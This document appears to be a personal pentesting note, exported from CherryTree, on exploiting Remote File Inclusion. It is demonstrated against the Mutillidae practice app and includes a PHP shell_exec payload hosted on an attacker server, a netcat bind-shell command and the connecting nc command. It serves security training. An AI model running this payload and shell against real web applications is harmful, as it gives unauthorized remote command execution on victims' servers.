<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Remote File Inclusion</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Remote File Inclusion</h1><br/><strong><h3>How to test</h3></strong><br />To immediately spot a vulnerable parameter, you can try to inject “http://www.google.com”<br /><code>vuln.php?page=</code><code><span style="color:#ff8700;">http://www.google.com</span></code><br />If it is vulnerable, the HTML code of google.com should be injected in the vulnerable web page.<br /><br /><strong><h3>How to Exploit</h3></strong><br />Build RFI attack payloads:<br />1. <span style="color:#ff0000;">Attacker machine:</span> Write PHP script (we call it <strong>id.php</strong>) that can runs a local shell command on the victim and displays the output<br />    Put this script on a Server controlled by the attacker, if we are in the same network then we can use the same attacker machine (example kali linux)<br />    PHP script executes the shell command of out choice, also a backdoor with netcat<br />   <div class="codebox"><div class="codebox">attacker@Server<span style="color:#ff9d00;font-weight:700">:/</span>#&nbsp;nano&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>id.php</div></div><br />   <div class="codebox"><div class="codebox">&lt;?php<br />&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;shell_exec<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&#39;&lt;command&gt;&#39;</span><span style="color:#ff9d00;font-weight:700">);</span><br />?&gt;</div></div><br />   <div class="codebox"><div class="codebox">&lt;?php<br /><span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;shell_exec<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&#39;ncat&nbsp;-l&nbsp;-p&nbsp;4242&nbsp;-e&nbsp;/bin/bash&#39;</span><span style="color:#ff9d00;font-weight:700">);</span><br />?&gt;</div></div><br />   We can write the PHP code as a single line:<br />   <div class="codebox"><div class="codebox">&lt;?php&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;shell_exec<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&#39;ncat&nbsp;-l&nbsp;-p&nbsp;4242&nbsp;-e&nbsp;/bin/bash&#39;</span><span style="color:#ff9d00;font-weight:700">);</span>&nbsp;?&gt;</div></div><br />2. <span style="color:#1e90ff;">Web Application:</span> Load and run via an RFI exploit<br />    https://www.example.org/mutillidae/index.php?page=http://[attackerIpServer]/shell.php<br />    <a href=""><img src="images/351-1.png" alt="images/351-1.png" /></a><br />    The page will not complete loading because it is now running a backdoor for us to connect into.<br />3. <span style="color:#ff0000;">Attacker machine:</span> Connect to the backdoor listener of the vulnerable Web<br />    <div class="codebox"><div class="codebox">root@kali<span style="color:#ff9d00;font-weight:700">:/</span>#&nbsp;nc&nbsp;www.example.org&nbsp;4242</div></div><br />    <a href=""><img src="images/351-2.png" alt="images/351-2.png" /></a></div>
</body>
</html>
